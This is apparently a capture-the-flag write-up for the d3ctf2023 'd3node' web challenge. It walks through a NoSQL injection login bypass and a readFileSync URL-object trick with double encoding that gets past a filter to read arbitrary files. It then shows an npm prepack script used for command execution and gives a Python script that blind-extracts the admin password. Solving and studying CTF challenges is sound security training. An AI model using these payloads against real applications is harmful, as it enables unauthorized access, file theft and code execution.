# d3ctf2023-web-d3node

Login page f12 found hint1

It is found that there is nosql injection and waf at the login, and players need to test it by themselves

```json
{"username": {"$regex": "admin"}, "password": {"$regex": "" }}
```

Log in and find hint2, hint2 hints the vulnerability of reading arbitrary files

```
/dashboardIndex/ShowExampleFile?filename=/proc/self/cmdline
```

When reading, if the filename parameter value has app, hacker will be echoed

Need to use the feature of readFileSync to bypass (there are many related articles on the Internet that analyze the specific principles)

Second url encoding may be required (the browser will automatically decode it once for you)

Read the app.js file

```
/dashboardIndex/ShowExampleFile?
filename[href]=aa&filename[origin]=aa&filename[protocol]=file:&filename[hostname]=&filename
[pathname]=/proc/self/cwd/%2561%2570%2570%252e%256a%2573
```

After reading app.js and other source codes, it is found that npm pack will be executed in /PackDependencies, and according to the official documentation of npm, you can set the prepack command in the scripts field, which will be executed before npm pack (you can use this to complete any command implement)

![](https://i.imgur.com/qU7SZuW.png)

You can set dependencies in the /SetDependencies route, using the override feature of Object.assign

```json
{
"name": "d3ctf2023",
"version": "1.0.0",
"dependencies": {
},
"scripts": {
"prepack": "/readflag >> /tmp/success.txt"
}
}
```

The above operations require admin privileges. The backend check logic is: the admin user name and the password corresponding to admin are required to write admin privileges in the current session

So you need to inject the admin password according to the nosql blind injection

```python
import requests
remoteHost = "localhost:8080"
burp0_url = f"http://{remoteHost}/user/LoginIndex"
dict_list = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_0123456789"
password = ""
for i in range(50):
	for i in dict_list:
		burp0_json={"password": {"$regex": f"^{password + i}.*"}, "username":
			{"$regex": "admin"}}
		res = requests.post(burp0_url, json=burp0_json,
		allow_redirects=False)
		if res.status_code == 302:
			password += i
			print(password)
			break
```
admin/dob2xdriaqpytdyh6jo3

Then read the above success.txt in the /ShowExampleFile route
